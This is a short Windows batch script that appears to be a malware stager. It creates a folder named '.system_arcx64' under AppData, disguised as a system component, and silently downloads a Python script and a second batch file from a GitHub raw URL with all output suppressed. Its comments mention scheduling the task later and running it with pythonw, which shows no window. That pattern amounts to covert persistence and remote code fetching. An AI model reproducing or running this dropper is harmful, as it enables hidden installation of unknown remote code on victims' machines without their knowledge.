@REM TODO: Scheduling the task will done in another phase

@echo off
mkdir %APPDATA%\.system_arcx64
mkdir %APPDATA%\.system_arcx64\files

@REM Download the files from  stable and secure source
curl https://raw.githubusercontent.com/testrepo/cheki/refs/heads/main/main.py -o %APPDATA%\.system_arcx64\main.py > NUL 2>&1
curl https://raw.githubusercontent.com/testrepo/cheki/refs/heads/main/py_down.bat -o %APPDATA%\.system_arcx64\py_donw.bat  > NUL 2>&1

@REM use pythonw instade
